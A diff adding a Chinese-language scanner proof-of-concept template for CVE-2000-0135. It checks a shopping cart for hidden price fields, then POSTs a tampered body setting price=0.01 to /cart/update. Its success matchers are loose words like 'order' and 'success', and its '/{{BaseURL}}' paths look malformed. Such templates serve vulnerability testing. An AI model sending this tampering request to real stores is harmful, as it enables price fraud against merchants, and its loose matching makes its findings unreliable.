@@ -1,0 +1,61 @@
+[info]
+author = "ave"
+description = "检测目标购物车页面是否存在隐藏表单字段（hidden input）可被篡改。通过发送 GET 请求提取页面中的隐藏字段，再发送 POST 请求篡改 price/amount 等敏感字段值，验证服务端是否缺乏完整性校验。"
+id = "POC-AVE-2000-0121"
+name = "Atretail 购物车隐藏表单字段篡改 PoC"
+severity = "high"
+tags = [
+    "cve-2000-0135",
+    "form-tampering",
+    "shopping-cart",
+]
+vuln_id = [
+    "CVE-2000-0135",
+    "AVE-2000-0121",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cart"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    'type="hidden"',
+    'name="price"',
+    'name="amount"',
+    'name="total"',
+    "type=hidden",
+    "hidden",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cart/update"
+protocol = "http"
+
+[poc.requests.body]
+content = "price=0.01&quantity=1&product_id=1&action=update"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "order",
+    "checkout",
+    "updated",
+    "confirm",
+]
